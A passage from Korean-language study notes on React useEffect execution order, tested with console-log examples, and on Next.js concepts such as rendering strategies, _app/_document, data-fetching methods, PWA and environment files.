  2. 브라우저 페인트 단계가 완료되면 useEffect가 실행된다. 이 때 내부 setState의 경우 비동기로 동작하기 때문에 백그라운드로 넘어가고 남은 console.log 3개가 찍히게 된다. 그렇기 때문에 "useEffect" 0이 연달아 3번 찍힌다.
  3. setState 처리 시 react는 batch update를 통해 일정 간격에 setState를 몰아서 처리하는데 가장 최종 setState 값이 3이기 때문에 3으로 변경된다. 하지만 위 예시의 경우 setState의 로직이 단순하기 때문에 3으로 처리되었지만 서로 복잡도가 다른 경우 비동기로 동작하기 때문에 결과를 보장할 수는 없다. 어쨋든 위 코드에서는 이전 값 0에서 3으로 변경되기 때문에 리렌더링이 발생하게 된다.
  4. 리렌더링이 발생하여 컴포넌트 몸체 부분의 console.log(state)가 실행되고 3을 출력한다.
  5. useEffect의 dependency가 변경되었기 때문에 useEffect가 실행된다. 이 때 setState의 경우 비동기로 처리되기 때문에 백그라운드로 넘어가고 남은 console.log 3개가 찍히게 된다. 그렇기 때문에 "useEffect" 3이 연달아 3번 찍힌다.
  6. setState 처리 시 이전 값 3에서 3으로 변경되기 때문에 원시 타입의 경우 불변성을 가지고 있어 새로운 메모리를 할당하는 것이 아닌 이전 값과 최신 값이 동일한 참조를 가리켜 리렌더링이 발생하지 않는 것이 맞지만 동일한 값이더라도 함수 몸체 부분은 한번 더 실행된다. 즉 비교하는 시점에서 함수 몸체 부분이 한번 더 실행되지만 실제 리렌더링은 발생하지 않는다. 그리고 그 후속 리렌더링은 건너뛰게 된다. (첫 번째 문제 7번과 동일한 내용)

- 세 번째 문제 : 자체적으로 만들어 봄, useEffect 동기 실행

  ```jsx
  import { useEffect, useState } from "react";

  const Main = () => {
    const [state, setState] = useState(0);

    console.log(state);

    useEffect(() => {
      const a = new Array(40000000).fill("test");
      console.log(1);
    }, []);

    useEffect(() => {
      console.log(2);
    }, []);

    return (
      <div className="wrap">
        <span>test1</span>
      </div>
    );
  };

  export default Main;
  ```

  ![react_실행_순서_패니지먼트_03](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/3615eb74-21c3-4661-9f48-d49dadd41e68)

  결과는 0 -> 1 -> 2 순으로 출력된다. 즉 첫 번째 useEffect는 배열을 400만개 만들어 'test' 문구를 채우는 무거운 작업을 하고 있는데도 두 번째 useEffect 보다 먼저 실행된다. 여기서 알 수 있는 점은 useEffect는 setState와 같이 비동기로 동작하여 백그라운드에 넘어가 큐에 쌓인 뒤 콜스택으로 들어오는 비동기 함수가 아니라는 점이다. 즉 페인트 이후 호출되는 특수한 함수라고 보면 된다. 위에서도 알 수 있듯이 useEffect가 여러 개인 경우 useEffect의 콜백 함수를 동기적으로 호출하고 실행하는 것을 알 수 있다. 이런 점에서 javascript의 일반 함수 흐름과 동일하게 동작하는 것을 확인할 수 있다.

  - 네 번째 문제 : 자체적으로 만들어 봄, useEffect와 자식 컴포넌트

    ```jsx
    // RenderParent.tsx
    import { useEffect, useState } from "react";
    import RenderChild1 from "./RenderChild1";
    import RenderChild2 from "./RenderChild2";
    import RenderChild3 from "./RenderChild3";
    import RenderChild4 from "./RenderChild4";

    const RenderParent = () => {
      console.log("render Parent");

      const [artistId, setArtistId] = useState("");

      useEffect(() => {
        console.log(`useEffect parent : ${artistId}`);
        setArtistId("테스트");
      }, [artistId]);

      return (
        <div>
          <RenderChild1 artistId={artistId}>
            <RenderChild2 artistId={artistId}>
              <RenderChild3 artistId={artistId} />
            </RenderChild2>
          </RenderChild1>
          <RenderChild4 artistId={artistId} />
        </div>
      );
    };

    export default RenderParent;
    ```

    ```jsx
    // RenderChild1.tsx
    import { useEffect } from "react";

    const RenderChild1 = ({ artistId, children }: any) => {
      console.log("render Child1");

      useEffect(() => {
        console.log(`useEffect 1 : ${artistId}`);
      }, [artistId]);

      return <div>{children}</div>;
    };

    export default RenderChild1;
    ```

    ```jsx
    // RenderChild2.tsx
    import { useEffect } from "react";

    const RenderChild2 = ({ artistId, children }: any) => {
      console.log("render Child2");

      useEffect(() => {
        console.log(`useEffect 2 : ${artistId}`);
      }, [artistId]);

      return <div>{children}</div>;
    };

    export default RenderChild2;
    ```

    ```jsx
    // RenderChild3.jsx
    import { useEffect } from "react";

    const RenderChild3 = ({ artistId }: any) => {
      console.log("render Child3");

      useEffect(() => {
        console.log(`useEffect 3 : ${artistId}`);
      }, [artistId]);

      return <div />;
    };

    export default RenderChild3;
    ```

    ```jsx
    // RenderChild4.tsx
    import { useEffect } from "react";

    const RenderChild4 = ({ artistId, children }: any) => {
      console.log("render Child4");

      useEffect(() => {
        console.log(`useEffect 4 : ${artistId}`);
      }, [artistId]);

      return <div>{children}</div>;
    };

    export default RenderChild4;
    ```

    ![react_실행_순서_패니지먼트_04](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/edc8d826-f909-480e-b95a-5e26c6c3cbdd)

    ```md
    render Parent
    render Child1
    render Child2
    render Child3
    render Child4
    useEffect 3 :
    useEffect 2 :
    useEffect 1 :
    useEffect 4 :
    useEffect parent :
    render Parent
    render Child1
    render Child2
    render Child3
    render Child4
    useEffect 3 : 테스트
    useEffect 2 : 테스트
    useEffect 1 : 테스트
    useEffect 4 : 테스트
    useEffect parent : 테스트
    render Parent
    ```

    위 코드는 RenderParent 컴포넌트 내부에 RenderChild1, RenderChild2, RenderChild3, RenderChild4를 자식 컴포넌트로 받아 렌더링하고 있다. 이 때 RenderChild1은 children props로 RenderChild2를 받고 있고 RenderChild2 또한 RenderChild3을 children props로 받고 있다. 이 때 콘솔 출력 결과는 위와 같다.

    1. 가장 상위 컴포넌트인 RenderParent 부터 시작해서 함수 몸체 부분의 콘솔이 찍힌다. 그리고 자식 컴포넌트들도 순차적으로 몸체 부분이 실행된다.
    2. useEffect는 가상 돔의 변화를 실제 돔에 적용시키는 Commit Phase 단계 후 브라우저 페인트 단계까지 마치고 나서 실행된다고 알고 있다. 그렇기 때문에 자식 컴포넌트를 가지고 있는 경우 자식 컴포넌트가 우선적으로 컴포넌트 렌더링 되어 리액트 엘리먼트 객체를 반환해야하므로 자식 컴포넌트의 컴포넌트 렌더링이 먼저 처리된다. 위 1번과 같은 함수 몸체 부분은 리액트 엘리먼트 객체를 반환하는 것이 아닌 몸체 부분만 실행하는 것이기 때문에 우선적으로 실행되는 것이다. 그렇기 때문에 자식 컴포넌트의 리액트 엘리먼트 객체를 반환하는 작업이 완료가 되면 자식 컴포넌트 먼저 useEffect가 돌기 때문에 useEffect는 3 -> 2 -> 1 -> 4 -> parent 순으로 실행이 된다. 이유는 useEffect는 동기적으로 실행되지만 1과 4는 같은 레벨을 가지고 있고 1의 자식으로 2와 3을 받고 있기 때문에 1의 자식 컴포넌트들의 리액트 엘리먼트 객체들이 먼저 반환되기 때문에 useEffect도 우선적으로 처리된다. depth가 가장 깊은 3이 먼저 실행되는 것을 확인할 수 있다. 그렇게 자식 컴포넌트인 3과 2가 먼저 실행된 후 렌더링 단에서 상위에 위치한 1이 실행되고 그 후 4가 실행되는 것을 볼 수 있다. 그리고 자식 컴포넌트들의 useEffect가 모두 완료된 후 최상위 부모의 useEffect가 실행된다.
    3. 최상위 부모의 useEffect가 실행되고 setState는 비동기로 동작하여 콜스택이 비어있을 때 state를 업데이트시키는데 state 업데이트가 완료되면 리렌더링이 발생한다. 그렇기 때문에 위 1 ~ 2번 과정을 반복한다. 다만 차이점은 2번에서 발생하는데 초기에 props는 비어있는 상태였다가 state가 변경되었기 때문에 props로 전달받은 state의 최신 값인 "테스트"라는 문구가 추가된 것을 볼 수 있다.
    4. 또한 추가로 최상위 부모의 useEffect는 state 변경으로 인해

<br><br><br>

## # Next.js(13버전 이전)

### # **Next.js 사용 이유**

1. 다양한 렌더링 전략 지원

   - CSR (Client-Side Rendering): 클라이언트에서 렌더링.

   - SSR (Server-Side Rendering): 요청 시 서버에서 HTML 생성.

   - SSG (Static Site Generation): 빌드 시 정적으로 HTML 생성.

   - ISR (Incremental Static Regeneration): 일부 페이지만 정적으로 생성하고, 필요할 때 다시 생성

2. 자동화된 최적화 기능 제공

   - 자동 코드 스플리팅: 페이지 단위로 청크 분리 → 초기 로딩 최적화

     - 예시

       - 1. pages/about.tsx → about.js라는 별도의 청크 파일로 빌드됨.

       - 2. 사용자가 / 페이지를 방문할 때는 about.js는 로드되지 않음.

       - 3. 사용자가 about 페이지로 이동할 때 해당 코드 청크가 그때서야 로딩됨 → Lazy Loading

   - 파일 기반 자동 라우팅: 디렉토리 구조만으로 라우팅 구성 가능

   - 폰트 및 이미지 자동 최적화: next/image로 크기, 포맷(WebP), image lazy loading 자동 처리 및 next/font으로 Google Fonts, Local Fonts 등을 빌드 타임에 자동으로 최적화

   - 프리 렌더링 및 프리 페칭: 기본적으로 빌드 타임에 필요한 페이지를 미리 생성하는 프리 렌더링 지원. 또한 `<Link>` 컴포넌트가 뷰포트에 진입하면 자동 프리 페치 → 빠른 페이지 전환

3. 성능 최적화 & SEO 유리

   - 프리 렌더링(SSG, SSR)으로 초기 페이지 로딩 속도 향상

   - HTML이 완성된 형태로 제공되기 때문에 검색 엔진 최적화(SEO)에 매우 유리

   - 코드 분할, 이미지 최적화, 폰트 최적화, 프리 페치 등으로 실제 사용자에게 빠른 체감 속도 제공

4. 개발 생산성 향상

   - API Routes: pages/api 디렉토리로 간단한 서버리스 백엔드 구현 가능

   - 환경변수, 국제화(i18n), TypeScript 통합 등 기본 제공

   - App Router, Middleware, React 최신 기능과 빠르게 연동 가능

<br>

### # **`_app`과 `_document`**

<br>

- `_app`

  (1) 가장 먼저 실행되는 컴포넌트입니다. (`_app` -> page component -> `_documnet(Server side)`)

  (2) 모든 페이지는 이 컴포넌트를 통합니다. (각 Route 구성 요소를 래핑하는 역할)

  (2) 페이지에 적용할 공통 레이아웃 역할을 합니다. (ex header, footer, layout component 등)

  (3) 페이지 전환 시 전체 레이아웃을 유지할 수 있습니다.

  (4) 페이지 전환 후 상태를 유지시킬 수 있습니다.

  (5) 글로벌 CSS를 적용시킬 수 있습니다.

  (6) 추가적인 데이터를 페이지로 주입시켜주는게 가능합니다.

  (7) 각종 Provider 설정할 수 있습니다. (ex Redux, Apollo 등)

  (8) props로 받는 Component는 페이지에 보여줄 컴포넌트이며, 페이지 전환 시 이 props의 값이 변경됩니다.

  (9) props로 받는 pageProps는 데이터 패칭 메소드를 통해 가져온 초기 객체입니다.

  (10) `_app` 내부에서는 getStaticProps 또는 getServerSideProps 메서드를 지원하지 않습니다.

  (11) `_app` 내부에 getInitialProps가 있는 경우 자동 정적 최적화가 비활성화 됩니다. 자동 정적 최적화란 요구사항이 없는 경우 자동으로 페이지를 정적으로 생성하는 것을 말합니다.

<br>

- `_document`

  (1) `_document`는 `_app` 다음에 실행되며, 공통적으로 활용할 head(ex meta태그)나 body 태그 안에 들어갈 내용들을 커스텀할 때 활용합니다.

  (2) 폰트 import, CDN 등을 연결하여 사용할 수 있습니다.

  (3) Document 클래스를 상속받는 클래스 컴포넌트로 작성해야한다는 규칙이 있습니다.

  (4) 렌더 함수는 꼭 Html, Head, Main, NextScript를 포함해야 합니다.

  (5) 페이지 별 공통적인 사항이 아닌 title같은 경우 app에서 처리합니다.

  (6) 서버 사이드에서 동작하기 때문에 onClick과 같은 이벤트나, CSS 스타일 파일은 작동하지 않습니다. 테스트해보기 위해 useEffect hook을 사용하여 console에 문자열이 찍히는지 확인해보았는데 역시 `_document`는 찍히지 않고 `_app`은 찍힙니다.

  (7) 커스텀이 필수는 아니며 커스텀하지 않을 경우 Next 모듈에 존재하는 document.js을 실행하게 됩니다.

  (8) Head 컴포넌트 조작 시 import 위치를 주의해야 합니다. `_document` 내부에 사용하는 모든 페이지에 공통적으로 적용시킬 Head의 경우 next/document에서 가져온 Head를 사용해야 합니다. 또 title 태그와 같이 페이지별로 다른 Head 설정을 할 경우에는 next/head에서 가져온 Head를 사용해야 합니다.

  (9) `_app`과 마찬가지로 `_document` 내부에서는 getStaticProps 또는 getServerSideProps 메서드를 지원하지 않습니다.

  (10) `_document`는 페이지 별 오버라이딩이 가능합니다. 하지만 공통으로 사용하고 있는 `_document`가 있다면 페이지 별로 지정 된 `_document`로 대체되어 문제가 발생할 수 있습니다.

<br>

### # **CRS, SSR, SSG, ISR**

<br>

- CRS (Client Side Rendering)

  - CRS이란?

    클라이언트 사이드 렌더링이다. react.js는 기본적으로 클라이언트 사이드 렌더링을 사용한다.

  - 동작 방식

    빈 html을 먼저 받아온 후 js을 통해 컴포넌트를 렌더링한다. HTML이 하나이기 때문에 SPA 특징이라고 볼 수 있다. 유저와의 상호작용이 잦은 경우 적합하다.

  - 장점

    - 페이지 전환 : 페이지 전환에 필요한 js 번들을 초기에 다운로드 하므로 페이지 전환 시 매우 빠르다.

    - TTV와 TTI 차이 : 하이드레이션(Hydration: 정적인 HTML에 js이벤트 및 상태를 연결하여 인터렉션이 가능하도록 하는 과정) 과정이 필요없으므로 바로 인터렉션이 가능하다.

  - 단점

    - 초기 로딩 속도 및 빈 화면 노출 : js를 통해 컴포넌트를 전환하여 view를 렌더링하므로 js 번들 크기가 크면 초기 로딩 속도가 느릴 수 있고 로딩하는 동안 사용자가 빈 화면을 보게 된다.

    - SEO 불리 : 빈 HTML을 사용하므로 SEO에 불리하다. 하지만 이 부분은 검색엔진마다 다를 수 있다. 일부 검색엔진의 크롤러는 Javascript를 지원하지 않지만 구글 크롤러는 ES5+ Javasciprt를 지원한다. 그렇기 때문에 CRS는 SEO가 불가능한 것이 아닌 상대적으로 불리한 것이다.

<br>

- SSR (Server Side Rendering)

  - SSR이란?

    서버 사이드 렌더링이다. next.js는 기본적으로 서버 사이드 렌더링을 사용한다. 비교적 인터렉션이 적고 데이터가 요청마다 한 번만 처리되어도 충분한 경우에 적합하다.

  - 동작 방식

    전통적인 방식으로 서버에서 데이터가 포함된 정적인(non-interactive) HTML을 받아와 우선적으로 view를 보여준 뒤 js 번들 다운 후 하이드레이션하여 interaction이 가능하도록 한다. 다만 SSR은 고전적인 static wep site와 같은 MPA에서 사용하던 렌더링 방식은 맞지만 SSR로 렌더링 되는 페이지가 무조건 MPA는 아니다. 페이지 요청 시 매번 페이지를 다시 생성하여 데이터를 넘겨주는 렌더링 방식이 SSR이다.

  - Next.js에서 SSR 동작 방식

    서버 사이드 렌더링은 완성된 HTML을 클라이언트에 전송해주는 것이라고 알고 있다. 여기서 HTML을 완성해서 보내주는 서버는 프론트엔드 정적 페이지를 배포하는 웹서버가 아닌 Next.js 자체 Node.js 서버를 말한다. Next.js는 이와 같이 Node.js 기반의 서버에서 동작하며 React.js와 달리 서버 사이드 렌더링을 지원할 수 있다. 결론은 Next.js 애플리케이션을 실행하면 자체 Node.js 서버도 함께 구동되고 이 곳에서 서버 사이드 렌더링을 처리한다. 즉 서버 사이드 렌더링 페이지 요청 시 브라우저 환경이 아닌 곳에서 자바스크립트를 실행할 수 있게 해주는 Node.js 자체 서버에서 서버 사이드 렌더링을 수행하며 컴포넌트가 return하는 React.createElement를 호출하여 React DOM을 생성하고 runtime CSS in js의 경우 CSS를 심어주는 것이다. 그렇기 때문에 렌더링의 일부분, 즉 DOM트리와 CSSOM 트리를 생성하는 파싱과 스타일 단계를 서버에게 위임하여 서버 사이드 렌더링이라고 지칭하는 것이다.

  - 장점

    - 초기 로딩 속도 및 사용자 경험 향상 : HTML을 먼저 받아오기 때문에 초기 로딩 속도가 빠르고 js 번들을 다운로드하며 병렬적으로 view를 보여주기 때문에 사용자 경험이 향상된다.

    - SEO 유리 : HTML이 완성되어 있으므로 SEO에 유리하다.

  - 단점

    - 화면 깜빡임 : 페이지 전환 시 모든 데이터를 새로 받아오기 때문에 화면 깜빡임이 발생한다.

    - TTV와 TTI 차이 : 서버에서 받아온 HTML을 우선 보여준 뒤 js 번들을 다운로드 받은 후 하이드레이션하는데 js 번들이 큰 경우 사용자가 뷰를 최초로 보는 시간(TTV)과 익터렉션이 가능한 시간(TTI)과의 간격이 벌어질 수 있다.

<br>

- SSG (Static Site Generation)

  - SSG란?

    pre-rendering이란 말 그대로 사전 렌더링을 말한다. 빌드 타임에 페이지를 미리 생성한다. next.js는 모든 페이지를 pre-rendering 하여 초기 렌더링 속도를 향상시킬 수 있다. 만약 외부 데이터 패칭이 필요 없는 경우 next.js의 컴포넌트를 그대로 사용하면 자동 정적 최적화를 통해 페이지를 미리 생성하고 해당 html을 엣지 서버에 캐싱하여 매 요청마다 재사용하여 제공한다. 만약 외부 데이터 패칭이 필요한 경우 getStaticProps를 사용하여 외부 데이터를 패칭한 후 pre-render 할 수 있다. 여기서 getStaticProps와 getServerSideProps의 차이점은 getServerSideProps 은 매 요청 시 호출되지만 getStaticProps 는 빌드 타임에 딱 한번만 호출된다. SSG 방식은 업데이트가 적거나 고정된 데이터를 사용하는 페이지에 적합하다.

  - 동작 방식

    빌드 타임에 페이지를 생성하며 모든 요청에서 미리 생성된 HTML을 재사용한다. 반면 SSR은 매 요청마다 서버에 HTML을 요청하고 생성하며 재사용하지 않는다.

  - 장점

    - 초기 로딩 속도 : 모든 페이지를 사전에 생성 및 엣지 캐싱하여 사용하므로 초기 페이지 로딩 속도가 매우 빠르다. (SSR과 다르게 빌드 시 페이지를 생성하므로 초기 로딩 속도는 더 빠르다.)

    - SEO 유리 : 검색 엔진은 정적인 HTML 파일을 쉽게 인덱싱할 수 있으므로 SEO가 용이하다.

  - 단점

    - 빌드 타임 : 생성되는 정적파일의 개수가 많은 경우 빌드 시간이 오래 걸릴 수 있다. 이런 경우 SSR을 사용하는 것이 유리할 수 있다.

    - 최신 데이터 미반영 : 페이지의 데이터가 변경되어도 다시 빌드 및 배포하지 않는 이상 반영되지 않는다.

<br>

- ISR (Incremental Static Regeneration)

  - ISR이란?

    pre-rendering 방식 중 하나로 정적 페이지 생성을 위해 말한다. next.js에서 getStaticProps 의 revalidate 를 통해 구현할 수 있다. getStaticProps 와의 차이점은 revalidate 시간마다 호출되어 정적 페이지를 재생성하여 업데이트할 수 있다. SSG의 단점을 보완한 방식으로, revalidate가 필요한 SSG 페이지(자주 변경되지 않는 동적인 컨텐츠를 일부 포함하는 경우)에 적합하다.

  - 동작 방식

    빌드 타임에 페이지를 생성하며 지정된 시간마다 페이지를 업데이트한다.

  - 장점

    - 초기 로딩 속도 : 모든 페이지를 사전에 생성 및 엣지 캐싱하여 사용하므로 초기 페이지 로딩 속도가 매우 빠르다. (SSR과 다르게 빌드 시 페이지를 생성하므로 초기 로딩 속도는 더 빠르다.)

    - 최신 데이터 반영 : 일정 시간마다 페이지를 업데이트하여 최신 정보를 제공할 수 있다. 단, 실시간으로 적용되는 최신 데이터는 아니다.

  - 단점

    - 적절한 빌드 주기 : 콘텐츠가 변경된 후에 사이트를 다시 방문하게 되어도 이전의 콘텐츠를 보게 되기 때문에, 새로운 콘텐츠를 적절한 시점에 확인하지 못할 수 있다. 즉 리빌딩되는 주기를 특정하기 어렵다.

<br>

### # getStaticProps, getStaticPath, getInitialProps, getServerSideProps

- getStaticProps

  getStaticProps는 정적 사이트 생성(SSG, Static Site Generation) 및 점진적 정적 생성(ISR, Incremental Static Regeneration)을 위해 사용되는 메소드로 빌드 타임에 호출되며 pre-rendering 시 외부 데이터를 받아오기 위해 사용한다.

  SSG와 ISR을 나누는 기준은 return 객체의 revalidate 옵션이며 revalidate 없다면 SSG로 동작하여 빌드 시 딱 한번만 호출된다는 특징이 있다. 단, 데이터 업데이트를 위해서는 재빌드 및 배포가 필요하다는 단점이 있다.

  revalidate가 존재하면 ISR로 동작하며 revalidate의 value 값에 따라 특정 주기마다 Next.js의 백그라운드에서 정적 페이지를 재생성한다. 만약 재생성 실패 시 기존 정적 페이지를 제공한다.

- getStaticPath

  getStaticPaths는 getStaticProps와 마찬가지로 pre-rendering을 위해 사용하는 메소드이다. getStaticProps와의 차이점은 `pages/**/[id].tsx`과 같이 동적 라우팅 페이지 중 빌드 시 정적으로 생성할 페이지를 path 속성을 통해 결정할 수 있다. 또한 fallback 속성을 활용하여 프리 렌더하지 않은 동적 라우팅 페이지에 대해 후속 처리를 할 수 있다. 프리 렌더하지 않은 동적 라우팅 페이지에 접근 시 false인 경우 404페이지를 반환하고 true인 경우 fallback에 할당 된 엘리먼트를 먼저 보여주고 getStaticProps로 프리렌더하여 결과물이 생성되면 교체한 뒤 getStaticPaths에 path로 추가한다. blocking인 경우 SSR과 같이 동작하고 결과물이 생성되면 띄워준 뒤 getStaticPaths에 path로 추가한다.

  ```jsx
  const component = (props) => {
    ...
  };

  export default component;

  export const getStaticPath = async () => {
    ... // API 호출 혹은 파일 시스템 접근 등의 코드 작성

    return {
      paths: [
        { params: {} } // 빌드 시 생성할 동적 페이지의 params
      ]
      fallback: true | false | 'blocking' // 필수 값
    };
  };
  ```

<br>

- getServerSideProps vs getInitialProps

  getServerSideProps와 getInitialProps의 공통점은 서버 사이드 렌더링 시 사용, 요청이 들어올 때 마다 매번 호출, 중첩 컴포넌트 트리 중 최상위 컴포넌트에서 실행, 자동 정적 최적화가 지원되지 않아 프리렌더 하지 않는다는 것이며 차이점은 getInitialProps는 라우팅 방식에 따라 호출 사이드가 달라지고 getServerSideProps는 항상 서버 사이드에서 동작한다. getInitialProps는 클라이언트 사이드 라우팅 시 클라이언트 사이드에서 동작하고 서버 사이드 라우팅 시 서버 사이드에서 동작한다.

<br>

### # **PWA(Progressive Web Apps)**

- PWA란?

  PWA(Progressive Web Apps)란 모바일 기기에서 네이티브 앱과 같은 사용자 경험을 제공하는 웹 앱이다. 즉 어떤 기술이나 앱을 뜻하는 것이 아닌, 비슷한 개념으로 반응형 웹 앱을 예로 들 수 있는데 이와 같이 사용자 경험을 기준으로 나타낼 수 있는 개념이다. PWA를 사용하면 사용자가 앱을 다운로드하고 업데이트 할 필요 없이 웹 브라우저를 통해 앱을 바로 사용할 수 있다.

- PWA 장단점

  - 장점

    - 훨씬 빠른 페이지 로딩 속도

      Service Worker 의 Cache API를 사용하여 데이터를 캐싱시킬 수 있다.

    - 오프라인 지원 (네트워크에 독립적)

      Service Worker 에 캐싱된 데이터를 가져오게 되면 네트워크가 오프라인 상태라도 서비스를 사용할 수 있게 된다. 단, 우선 Service Worker에 캐싱을 해야되기 때문에 1, 2번은 페이지를 한 번이라도 방문 해야 한다.

    - 검색 가능

      웹 앱의 특성 그대로 검색이 가능하다.

    - 설치 가능 (홈 화면에 추가)

      PWA 는 모바일 브라우저를 사용하는 디바이스의 홈 화면에 추가 즉, 설치와 같이 등록 할 수 있다.

    - 공유 가능 (링크를 통한)

      웹 앱 이기 때문에 URL을 통한 공유도 가능하다.

    - 푸시알림을 통한 지속적 참여 유도

      최신 브라우저에서 Web API인 Push API 를 사용하여 서버로부터 알림을 push event로 받고, Notification API 을 이용해 브라우저에 시스템 알림을 보여 줄 수 있다.

    - 반응형 웹 화면

      PWA 의 가장 기본은 반응형 웹 앱 이기 때문에 웹 브라우저를 사용하는 다양한 디바이스의 화면에 모두 대응할 수 있다.

    - 안전

      PWA 을 구현하기 위한 기술은 HTTPS 에서만 사용이 가능하고 브라우저의 보안정책인 CORS 등을 따르기 때문에 보안적인 이점도 있다.

    - 점진적, 구축이 쉬움

      기존에 구축된 웹 앱에 Service Worker와 Manifest.json 파일을 만들어 PWA로 구축하는 것은 매우 쉽고 또, 점진적으로 PWA에 요구되는 기능들을 하나씩 점진적으로 추가해 갈 수 있다.

  - 단점

    - PWA에 대한 인지도 부족, 앱 설치의 애매함

      사용자들에게 PWA는 익숙하지 않기 때문에 접근성이 낮을 수 있다. 스토어를 통해 설치된 앱은 그나마 안전하다는 인식을 가지고 있지만 PWA와 같이 홈 화면 추가 기능을 통한 앱 설치는 아니다.

    - Non-native UI

      네이티브 앱에서 느낄 수 있는 각 운영체제 고유의 UI와 사용자 경험을 제공할 수 없다.

    - Apple의 소극적인 지원

      Apple은 아이폰 11.3 버전(2018년)이 되어서야 PWA를 지원했다. PWA의 핵심 중 하나인 푸시 알림 기능의 경우 안드로이드에서는 오래전부터 가능했지만 iOS에서는 아직도 불가능한 상황이다. 하지만 Apple은 WWDC22(2022 연례 세계 개발자 콘퍼런스)에서 2023년에는 웹 푸시와 관련한 모든 API를 지원할 것이라고 알렸다.

    - 게임과 같은 고사양 앱 개발 불가능

      현재 웹 기술이 계속해서 발전하고 있지만 운영체제의 자원을 직접적으로 사용할 수 있는 네이티브 앱의 퍼포먼스는 따라잡을 수 없다. 높은 연산을 요구하는 작업, 그래픽 사용이 필수인 게임 앱 개발에는 한계가 있다.

<br>

### # Next.js의 환경 변수

<br>

- .env

  가장 우선순위가 낮다. 모든 환경에서 공통으로 사용할 디폴트 키를 관리한다.

- .env.development

  개발 환경(process.env.NODE_ENV === 'development') 에서 적용된다. 개발환경일 경우, .env에 같은 환경변수가 있다면 덮어쓴다.

- .env.production

  배포/빌드 환경(process.env.NODE_ENV === 'production') 에서 적용된다. 배포환경일 경우, .env에 같은 환경변수가 있다면 덮어쓴다.

- .env.local

  모든 환경 변수보다 우선순위가 높다. 다른 환경 변수 파일에 동일한 환경 변수가 있다면 해당 값들을 덮어쓴다.

- .env.test

  테스트 환경(process.env.NODE_ENV === 'test') 에서 적용된다.

<br>

### # **컴포넌트 내부의 실행 순서**

<br>

app -> outer -> inner 컴포넌트가 있다. 그리고 각 컴포넌트 내부에는 로직단에 console.log, useEffect, useLayoutEffect, 렌더단에 console.log 즉시실행함수가 있다.

1. 처음으로 최상위 컴포넌트 app의 로직단인 console.log 1과 console.2 가 실행된다.
2. app의 로직단 실행 후 렌더단의 return 함수가 실행된다. 왜냐하면 화면을 렌더링 하기 위해 자식 컴포넌트가 필요하기 때문이다.
3. app의 자식 컴포넌트인 outer 컴포넌트의 로직단인 console.log 1과 console.2 가 실행된다.
4. outer의 로직단 실행 후 렌더단의 return 함수가 실행된다. 이유는 위와 동일하다.
5. outer의 자식 컴포넌트인 inner 컴포넌트의 로직단인 console.log 1과 console.2 가 실행된다.
6. inner의 로직단 실행 후 렌더단의 return 함수가 실행된다. 이유는 위와 동일하다.
7. inner의 렌더단을 실행하여 컴포넌트의 상태를 가상 돔의 적용시키는 렌더 단계, 실제 돔의 적용시키는 커밋 단계가 완료된 후 브라우저가 실제 돔을 그리는 페인트 단계 전 useLayoutEffect가 실행된다.
8. outer는 자식 컴포넌트 inner의 렌더링이 완료되었기 때문에 렌더 단계, 커밋 단계를 완료한 후 브라우저의 페인트 단계 전 useLayoutEffect가 실행된다.
9. app은 자식 컴포넌트 outer의 렌더링이 완료되었기 때문에 렌더 단계, 커밋 단계를 완료한 후 브라우저의 페인트 단계 전 useLayoutEffect가 실행된다.
10. 모든 useLayoutEffect가 실행된 후 페인트 단계가 이루어지고 페인트 단계가 끝난 후 자식 컴포넌트부터 순차적으로 useEffect가 실행된다.

위 내용을 정리해보면 아래와 같다.

1. 실행 순서는 정순으로 부모 컴포넌트부터 자식 컴포넌트의 순으로 실행되는 것을 알 수 있다. (위에 결과에서 console.log와 return은 app → outer → inner 순으로 실행된다.)
2. 가상 DOM과 실제 DOM을 활용하여 DOM의 변경 사항을 적용시키는 렌더, 조정, 커밋 단계는 역순으로 자식 컴포넌트부터 부모 컴포넌트 순으로 이루어지는 것을 알 수 있다. 이유는 부모 컴포넌트의 페이지가 그려지기 위해서는 자식 컴포넌트가 필요하기 때문인 것 같다. (위에 결과에서 렌더, 조정, 커밋 단계 후 브라우저의 페인트 단계 전 실행되는 useLayoutEffect가 inner → outer → app 순으로 실행되었다.)
3. 브라우저가 컴포넌트의 변경 사항이 적용된 DOM을 실제로 페이지에 그리는 페인트 단계 또한 역순으로 자식 컴포넌트부터 이루어지는 것을 알 수 있다. 이유는 위와 같이 부모 컴포넌트의 페이지가 그려지기 위해서는 자식 컴포넌트가 필요하기 때문인 것 같다. (위에 결과에서 브라우저의 페인트 단계 후 실행되는 useEffect가 inner → outer → app 순으로 실행되었다.)

또한 추가로 컴포넌트가 app -> outer -> inner의 관계가 아닌 app -> outer -> outer의 children 과 같이 children props를 활용한 관계에서도 위와 동일한 순서로 코드가 실행된다.

<br>

### # Nextjs 13 변경점

- data fetching

  - getStaticProps : fetch(URL, { cache: 'force-cache' });

  - getServerSideProps : fetch(URL, { cache: 'no-store' });

  - getStaticProps + revalidate : fetch(URL, { next: { revalidate: 10 } });

  - getStaticPath : generateStaticParams

    ```jsx
    // app/products/[id]/page.tsx
    // ✅ 여기에 선언해야 함 (컴포넌트 함수 바깥)
    export const dynamicParams = false; // 과거 fallback 속성, blocking의 경우 'force-dynamic'로 설정

    // 1. 프리빌드할 목록 지정
    export async function generateStaticParams() {
      return [{ id: "1" }, { id: "2" }];
    }

    // 2. 실제 페이지 렌더링
    export default async function ProductPage({
      params,
    }: {
      params: { id: string },
    }) {
      const product = await getProductById(params.id);
      return <div>{product.name}</div>;
    }
    ```

<br>

### # NextJs - 코딩앙마 강좌 2022.08.14

- create-next-app 으로 설치하면?

1. 컴파일과 번들링이 자동으로 된다. (webpack과 bable)
2. 자동 refresh 기능으로 수정하면 화면에 바로 반영된다. (yarn dev)
3. server side rendering이 지원된다.
4. static file을 지원한다.

- pages 디렉토리 하위에 js 파일 생성하면 정적 라우팅 기능 제공(ex pages -> about.js 생성 : http://localhost:3000/about)

- pages 디렉토리 하위에 디렉토리 생성 후 `[id].js` 파일 생성하면 다이나믹 라우팅 기능 제공(ex pages -> view -> `[id].js` : http://localhost:3000/view/3

- `_app.tsx`란?

1. 모든 페이지는 이 컴포넌트를 통한다.
2. 레이아웃을 만들 때 이 컴포넌트를 이용한다. (헤더, 푸터, 레이아웃 컴포넌트 등 추가)
3. 페이지 전환시 레이아웃을 유지할 수 있다.
4. 페이지 전환시 상태값을 유지할 수 있다.
5. componentDidCatch를 이용해서 커스텀 에러 핸들링을 할 수 있다.
